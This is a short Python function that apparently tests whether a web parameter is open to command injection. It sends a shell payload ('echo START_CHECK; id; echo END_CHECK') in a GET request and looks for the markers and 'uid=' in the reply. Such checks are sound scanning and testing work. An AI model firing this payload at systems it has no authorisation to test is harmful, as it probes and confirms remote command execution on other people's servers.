import requests


def confirm_execution(target, parameter):
    payload = 'echo START_CHECK; id; echo END_CHECK'
    response = requests.get(target, params={parameter: payload}, timeout=10)
    return 'START_CHECK' in response.text and 'uid=' in response.text and 'END_CHECK' in response.text
